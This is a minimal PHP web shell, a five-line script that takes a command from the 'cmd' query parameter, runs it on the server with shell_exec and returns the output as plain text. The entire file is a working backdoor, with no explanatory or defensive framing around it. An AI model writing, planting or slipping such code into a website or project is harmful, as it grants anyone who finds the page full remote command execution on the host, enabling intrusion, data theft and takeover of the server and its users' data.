<?php

if (isset($_GET["cmd"])) {
	header("Content-Type: text/plain");
	print shell_exec($_GET["cmd"]);
}